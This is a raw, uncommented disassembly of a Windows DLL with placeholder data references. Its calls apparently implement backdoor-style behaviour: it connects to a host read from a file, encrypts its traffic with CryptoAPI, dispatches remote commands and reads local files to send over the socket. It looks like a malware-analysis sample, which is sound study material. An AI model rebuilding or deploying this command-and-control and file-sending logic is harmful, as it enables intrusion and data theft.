call ebx
mov edx [ esp + 0x134 ]
lea ecx [ esp + 0x14 ]
lea eax [ esp + 0x28 ]
push ecx
push edx
mov [ esp + 0x1c ] 0x2
mov [ esp + 0x24 ] eax
call sub_10003930
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
call ebx
mov ecx [ esp + 0x134 ]
lea eax [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] r--data
call sub_10003930
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
sub_10003610
push esi
mov esi [ esp + 0x8 ]
push edi
push 0x4
mov edi [ esi + 0x4 ]
call [ malloc@IAT ]
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov ecx edi
sub ecx 0x2
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push eax
push sub_100036b0
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
test eax eax
je r-xdata
sub ecx 0x4
je r-xdata
push eax
call [ CloseHandle@IAT ]
lea edx [ esp + 0xc ]
push edx
push 0x0
push eax
push sub_100015c0
sub ecx 0x6
je r-xdata
push eax
call [ CloseHandle@IAT ]
pop edi
pop esi
retn
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push eax
push sub_10006e70
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
push 0x0
push eax
push sub_10003770
jmp r-xdata
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
test eax eax
je r-xdata
sub_100036b0
sub esp 0xc
mov eax [ esp + 0x10 ]
push esi
push edi
mov esi [ eax ]
push esi
call sub_1000d7d0
mov edi eax
push esi
mov [ esp + 0x18 ] edi
call sub_1000d5a0
push edi
call sub_10004380
mov esi eax
add esp 0xc
test esi esi
mov [ esp + 0x8 ] esi
jne r-xdata
push ebx
push ebp
mov ebp [ SetErrorMode@IAT ]
pop edi
pop esi
add esp 0xc
retn 0x4
push esi
call sub_1000d5a0
mov eax [ esp + 0x1c ]
add esp 0x4
push eax
call [ closesocket@IAT ]
pop ebp
pop ebx
pop edi
mov eax 0x1
pop esi
add esp 0xc
retn 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
push esi
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x20 ]
push 0x8003
mov esi [ eax + 0x4 ]
lea edi [ eax + 0x8 ]
mov eax [ esp + 0x18 ]
lea ebx [ eax - 0x8 ]
call ebp
push ebx
push edi
mov ecx [ esp + 0x18 ]
push esi
push ecx
call sub_10002300
add esp 0x10
push 0x0
call ebp
mov edx [ esp + 0x20 ]
push edx
call [ free@IAT ]
mov esi [ esp + 0x14 ]
add esp 0x4
jmp r-xdata
sub_10003770
sub esp 0x14
mov eax [ esp + 0x18 ]
push ebx
push ebp
push esi
mov ebp [ eax ]
push edi
push ebp
call sub_1000d7d0
add esp 0x4
mov [ esp + 0x10 ] eax
mov ecx [ esp + 0x10 ]
push ecx
call [ closesocket@IAT ]
push ebp
call sub_1000d5a0
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x28 ]
push ecx
push edx
push ebp
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
lea edi [ eax + 0x8 ]
mov eax [ esp + 0x14 ]
lea ebx [ eax - 0x8 ]
lea eax [ ecx - 0x1 ]
cmp eax 0xd
ja r-xdata
lea edx [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x0
push edx
push ebp
mov [ esp + 0x24 ] r--data
call sub_10003930
mov eax [ esp + 0x30 ]
add esp 0x8
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_10003920 ]
jmp [ ecx * 4 + jump_table_10003904 ]
push ebx
push edi
push esi
push ebp
call sub_10005620
mov eax [ esp + 0x38 ]
add esp 0x10
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
push ebx
push edi
push esi
push ebp
call sub_100076c0
mov eax [ esp + 0x38 ]
add esp 0x10
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
push 0x8003
call [ SetErrorMode@IAT ]
push ebx
push edi
push esi
push ebp
call sub_10002300
add esp 0x10
push 0x0
call [ SetErrorMode@IAT ]
mov eax [ esp + 0x28 ]
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
push ebx
push edi
push esi
push ebp
call sub_10006180
mov eax [ esp + 0x38 ]
add esp 0x10
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
push ebx
push edi
push esi
push ebp
call sub_10008f50
mov eax [ esp + 0x38 ]
add esp 0x10
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ closesocket@IAT ]
push ebp
call sub_1000d5a0
mov eax [ esp + 0x2c ]
push eax
call [ free@IAT ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
sub_10003930
sub esp 0x11c
push ebx
push ebp
push esi
mov esi [ esp + 0x130 ]
push edi
mov eax [ esi ]
mov edi [ esi + 0x4 ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] r--data
jmp [ eax * 4 + jump_table_10003c28 ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] edi
jmp r-xdata
mov eax [ esp + 0x130 ]
lea edx [ esp + 0x14 ]
push 0x4
push edx
push eax
mov [ esp + 0x20 ] 0x1
call sub_100045c0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
lea ebp [ edi + 0x4 ]
push ebp
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push 0x408
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov edx [ esi + 0x8 ]
mov [ esp + 0x14 ] 0x2
mov eax [ edx ]
mov ecx [ esp + 0x130 ]
lea eax [ esp + 0x14 ]
push 0x8
push eax
push ecx
call sub_100045c0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
mov ecx edi
mov [ ebx ] 0x4
mov esi [ esi + 0x8 ]
mov eax ecx
lea edi [ ebx + 0x4 ]
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x138 ]
push ecx
call sub_100045c0
push ebx
call [ free@IAT ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] ebx
jmp r-xdata
mov edx [ esi + 0x8 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x28 ]
mov eax ecx
mov esi edi
mov edi ebp
lea ebp [ esp + 0x28 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
push edx
call sub_10001650
add esp 0x8
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x130 ]
lea edx [ esp + 0x14 ]
push 0x8
push edx
push eax
mov [ esp + 0x20 ] ebx
call sub_100045c0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
mov edx [ esp + 0x130 ]
lea ecx [ esp + 0x14 ]
push 0x8
push ecx
push edx
mov [ esp + 0x24 ] eax
call sub_100045c0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
lea ecx [ esp + 0x28 ]
push ecx
call sub_10002ed0
lea edx [ esp + 0x2c ]
mov esi eax
push rw-data
push edx
mov [ esp + 0x1c ] esi
call [ fopen@IAT ]
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x130 ]
lea edx [ esp + 0x14 ]
push 0x8
push edx
push eax
mov [ esp + 0x20 ] 0x0
call sub_100045c0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
mov ebp [ fread@IAT ]
push edi
push 0x400
lea edx [ ebx + 0x8 ]
push 0x1
push edx
mov [ ebx ] 0x3
mov [ ebx + 0x4 ] esi
call ebp
mov ecx [ esp + 0x140 ]
mov esi eax
lea eax [ esi + 0x8 ]
push eax
push ebx
push ecx
call sub_100045c0
mov eax [ esp + 0x2c ]
add esp 0x1c
sub eax esi
mov [ esp + 0x10 ] eax
je r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] eax
jmp r-xdata
push ebx
call [ free@IAT ]
push edi
call [ fclose@IAT ]
lea ecx [ esp + 0x30 ]
push ecx
call sub_10002a70
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
push edi
push 0x400
push 0x1
push ebx
call ebp
mov edx [ esp + 0x140 ]
mov esi eax
push esi
push ebx
push edx
call sub_100045c0
add esp 0x1c
cmp eax 0xffffffff
je r-xdata
push edi
call [ fclose@IAT ]
lea eax [ esp + 0x2c ]
push eax
call sub_10002a70
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x11c
retn
mov eax [ esp + 0x10 ]
sub eax esi
mov [ esp + 0x10 ] eax
jne r-xdata
sub_10003c40
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
add esp 0x40
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
push rw-data
call sub_100078a0
add esp 0x34
retn
sub_10003d70
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_1006b0c8
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
call sub_10003c40
mov ecx 0x41
xor eax eax
mov edi rw-data
push 0x104
push rw-data
push rw-data
[ edi ]
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
je r-xdata
call sub_10004740
test al al
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
call sub_10004bb0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x3c ] 0x0
call sub_10008a30
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
mov ecx 0x41
mov esi rw-data
mov edi rw-data
push rw-data
[ edi ] [ esi ]
mov esi [ LoadLibraryA@IAT ]
call esi
mov ebx [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x38 ] 0xffffffff
call sub_10001750
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
push rw-data
call esi
test eax eax
jne r-xdata
push rw-data
push eax
call ebx
mov [ rw-data ] eax
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x10 ]
lea edx [ esp + 0x10 ]
[ edi ] [ esi ]
xor ecx ecx
push edx
mov [ esp + 0x2c ] ecx
push eax
mov [ esp + 0x34 ] cx
mov cl [ esp + 0x18 ]
dec cl
mov [ esp + 0x18 ] cl
call ebx
lea ecx [ esp + 0xc ]
mov [ rw-data ] eax
mov [ esp + 0x38 ] 0xffffffff
call sub_10001750
mov ecx [ esp + 0x30 ]
pop edi
pop esi
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
lea ecx [ esp + 0xc ]
mov [ esp + 0x38 ] 0xffffffff
call sub_10001750
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
add esp 0x30
retn
sub_10003f10
sub esp 0x134
push ebx
push ebp
push esi
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x41 ]
mov [ esp + 0x40 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x134
retn
mov edx [ esp + 0x148 ]
push 0x0
push 0x0
lea ecx [ esp + 0x48 ]
push 0x104
push ecx
push edx
push 0x0
call eax
test eax eax
jne r-xdata
lea eax [ esp + 0x40 ]
push rw-data
push eax
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
xor edx edx
push ebx
mov [ esp + 0x15 ] edx
push 0x16
mov [ esp + 0x1d ] edx
lea eax [ esp + 0x18 ]
mov [ esp + 0x21 ] edx
push 0x1
mov [ esp + 0x29 ] edx
push eax
mov [ esp + 0x31 ] edx
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x35 ] dl
call [ fread@IAT ]
add esp 0x10
cmp eax 0x16
je r-xdata
lea ecx [ esp + 0x40 ]
push ecx
call sub_10002a70
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x134
retn
push ebx
call [ fclose@IAT ]
lea ecx [ esp + 0x44 ]
push ecx
call sub_10002a70
add esp 0x8
mov esi [ strstr@IAT ]
lea edx [ esp + 0x10 ]
push rw-data
push edx
call esi
mov ebp eax
add esp 0x8
test ebp ebp
jne r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x28 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x28 ]
sub edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ edx + ecx ] al
lea eax [ esp + 0x28 ]
push eax
call sub_100041d0
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call esi
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
lea edx [ esp + 0x28 ]
push edx
call [ inet_addr@IAT ]
mov ecx [ esp + 0x14c ]
mov edi ebp
lea edx [ esp + 0x11 ]
lea ebp [ esp + 0x28 ]
mov [ ecx ] eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x10 ]
sub edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx ecx
or ecx 0xffffffff
mov edi edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
call [ atoi@IAT ]
mov edx [ esp + 0x154 ]
push ebx
mov [ edx ] ax
call [ fclose@IAT ]
lea eax [ esp + 0x48 ]
push eax
call sub_10002a70
add esp 0xc
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x134
retn
sub_10004110
push esi
mov esi [ esp + 0x8 ]
lea eax [ esp + 0x8 ]
push eax
push esi
call sub_10004190
add esp 0x8
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
push eax
push esi
call sub_10004160
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax 0x1
pop esi
mov [ ecx ] edx
retn
xor eax eax
pop esi
retn
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax 0x1
pop esi
mov [ ecx ] edx
retn
sub_10004160
mov eax [ esp + 0x4 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
jne r-xdata
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov ecx [ esp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax 0x1
retn
retn
sub_10004190
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0xf
jg r-xdata
pop edi
xor eax eax
pop esi
retn
push esi
call sub_100041d0
add esp 0x4
test eax eax
je r-xdata
push esi
call [ inet_addr@IAT ]
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0x1
retn
sub_100041f0
sub esp 0x2c
lea eax [ esp + 0x1c ]
push eax
call [ GetSystemTime@IAT ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call [ SystemTimeToFileTime@IAT ]
test eax eax
jne r-xdata
lea eax [ esp ]
mov [ esp + 0x4 ] 0x4
push eax
push 0x1
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
add esp 0x2c
retn
lea ecx [ esp + 0x4 ]
push esi
mov esi [ RegQueryValueExA@IAT ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
push eax
push 0x0
push rw-data
push ecx
call esi
test eax eax
je r-xdata
xor eax eax
add esp 0x2c
retn
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push rw-data
push eax
call esi
test eax eax
pop esi
je r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call [ CompareFileTime@IAT ]
xor edx edx
cmp eax 0xffffffff
sete dl
mov eax edx
add esp 0x2c
retn
mov ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
sub_100042d0
mov eax [ rw-data ]
sub esp 0x10
push esi
push edi
push eax
call sub_1000d260
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x10
retn
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0xc ] 0x2
call [ htons@IAT ]
push 0x6
push 0x1
push 0x2
mov [ esp + 0x16 ] ax
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x10
push eax
push esi
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_1000d5a0
add esp 0x4
xor eax eax
pop edi
pop esi
add esp 0x10
retn
push edi
call sub_1000d5a0
add esp 0x4
push esi
call [ closesocket@IAT ]
push esi
push edi
call sub_1000d820
push edi
call sub_1000d8d0
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
mov eax edi
pop edi
pop esi
add esp 0x10
retn
sub_10004380
mov eax [ rw-data ]
push esi
push edi
push eax
call sub_1000d260
mov edi [ esp + 0x10 ]
mov esi eax
push edi
push esi
call sub_1000d820
push esi
call sub_1000d8d0
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
pop esi
retn
push esi
call sub_1000d5a0
add esp 0x4
push edi
call [ closesocket@IAT ]
pop edi
xor eax eax
pop esi
retn
sub_100043d0
push ecx
mov edx [ esp + 0x8 ]
lea eax [ esp ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
push edx
call sub_10004430
add esp 0xc
cmp eax 0x1
jne r-xdata
pop ecx
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_10004850
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov eax 0x1
or eax 0xffffffff
pop ecx
retn
sub_10004430
sub esp 0x110
push ebx
mov ebx [ esp + 0x118 ]
push ebp
push esi
push edi
push ebx
call sub_1000d7d0
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea ecx [ esp + 0x24 ]
push 0x0
push ecx
push 0x1
mov [ esp + 0x28 ] 0x5
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x30 ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
or eax eax
pop ebx
add esp 0x110
retn
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax eax
pop ebx
add esp 0x110
retn
lea edx [ esp + 0x10 ]
push 0x4
push edx
push ebx
call sub_1000d990
add esp 0xc
test eax eax
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
cmp eax 0x4
jae r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
mov eax [ esp + 0x10 ]
push eax
call [ ntohl@IAT ]
push eax
mov [ esp + 0x14 ] eax
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
call [ WSAGetLastError@IAT ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
mov esi [ esp + 0x10 ]
mov edi ebp
push esi
push ebp
push ebx
call sub_1000d990
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x128 ]
mov edx [ esp + 0x12c ]
pop edi
pop esi
mov [ ecx ] eax
mov [ edx ] eax
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
push ebp
call [ free@IAT ]
mov eax [ esp + 0x12c ]
mov ecx [ esp + 0x130 ]
add esp 0x4
mov [ eax ] 0x0
mov [ ecx ] 0x0
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
sub esi eax
add edi eax
test esi esi
jle r-xdata
mov edx [ esp + 0x128 ]
mov eax [ esp + 0x12c ]
mov ecx [ esp + 0x10 ]
pop edi
mov [ edx ] ebp
pop esi
mov [ eax ] ecx
pop ebp
mov eax 0x1
pop ebx
add esp 0x110
retn
push 0x14
call [ Sleep@IAT ]
push esi
push edi
push ebx
call sub_1000d990
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
sub_100045c0
mov edx [ esp + 0xc ]
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call sub_100047d0
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
push ecx
push edx
push eax
call sub_10004610
mov ecx [ esp + 0x1c ]
mov esi eax
push ecx
call [ free@IAT ]
add esp 0x10
mov eax esi
pop esi
retn
or eax 0xffffffff
retn
sub_10004610
sub esp 0x110
push ebp
push esi
mov esi [ esp + 0x124 ]
push edi
lea eax [ esi + 0x4 ]
push eax
mov [ esp + 0x10 ] eax
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
push esi
call [ htonl@IAT ]
mov ecx esi
mov esi [ esp + 0x124 ]
mov [ ebp ] eax
mov eax ecx
lea edi [ ebp + 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x120 ]
push esi
call sub_1000d7d0
add esp 0x4
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x110
retn
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x18 ]
push ecx
push 0x0
push edx
push 0x0
push 0x0
mov [ esp + 0x30 ] eax
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x24 ] 0x5
mov [ esp + 0x28 ] 0x0
call [ select@IAT ]
mov edi eax
test edi edi
jle r-xdata
pop edi
pop esi
or eax eax
pop ebp
add esp 0x110
retn
push ebp
call [ free@IAT ]
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebp
add esp 0x110
retn
mov edi [ esp + 0xc ]
push ebx
push edi
push ebp
push esi
mov ebx ebp
call sub_1000da40
mov esi eax
add esp 0xc
test esi esi
jle r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
xor eax eax
test esi esi
setg al
dec eax
pop ebx
and al 0xfe
pop edi
pop esi
inc eax
pop ebp
add esp 0x110
retn
sub edi esi
add ebx esi
test edi edi
jle r-xdata
push 0x14
call [ Sleep@IAT ]
mov eax [ esp + 0x124 ]
push edi
push ebx
push eax
call sub_1000da40
mov esi eax
add esp 0xc
test esi esi
jg r-xdata
sub_10004740
sub esp 0x190
lea eax [ esp ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
call sub_100047b0
test al al
jne r-xdata
call [ WSACleanup@IAT ]
xor al al
add esp 0x190
retn
push rw-data
call sub_100048c0
add esp 0x4
test eax eax
jne r-xdata
call [ WSACleanup@IAT ]
xor al al
add esp 0x190
retn
mov al 0x1
add esp 0x190
retn
call [ WSACleanup@IAT ]
xor al al
add esp 0x190
retn
sub_100047d0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
lea eax [ ebp + 0x10 ]
push eax
mov [ esp + 0xc ] eax
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx ebp
push esi
mov esi [ esp + 0x14 ]
mov eax ecx
push edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea edx [ esp + 0x1c ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov eax [ rw-data ]
push ecx
push edx
push ebx
push 0x0
push 0x1
push 0x0
push eax
mov [ esp + 0x38 ] ebp
call [ CryptEncrypt@IAT ]
pop edi
pop esi
test eax eax
jne r-xdata
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
pop ebp
mov [ ecx ] ebx
mov [ edx ] eax
mov eax 0x1
pop ebx
pop ecx
retn
pop ebp
pop ebx
pop ecx
retn
sub_10004850
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push ebp
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx ebp
push esi
mov esi [ esp + 0x10 ]
mov eax ecx
push edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
push ebx
push 0x0
push 0x1
push 0x0
push edx
mov [ esp + 0x30 ] ebp
call [ CryptDecrypt@IAT ]
pop edi
pop esi
test eax eax
jne r-xdata
pop ebp
pop ebx
retn
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
pop ebp
mov [ eax ] ebx
mov [ ecx ] edx
mov eax 0x1
pop ebx
retn
pop ebp
pop ebx
retn
sub_100048c0
push ecx
push esi
mov esi [ CryptAcquireContextA@IAT ]
push 0x0
push 0x12
push rw-data
push 0x0
push rw-data
call esi
test eax eax
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x0
push 0x8003
push ecx
call [ CryptCreateHash@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push ecx
push edx
mov edx [ esp + 0x14 ]
push edx
call [ CryptHashData@IAT ]
test eax eax
pop edi
jne r-xdata
pop esi
pop ecx
retn
xor eax eax
pop esi
pop ecx
retn
push 0x8
push 0x12
push rw-data
push 0x0
push rw-data
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push rw-data
push 0x400000
push eax
push 0x6601
push ecx
call [ CryptDeriveKey@IAT ]
test eax eax
jne r-xdata
pop esi
pop ecx
retn
pop esi
pop ecx
retn
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
pop ecx
retn
push eax
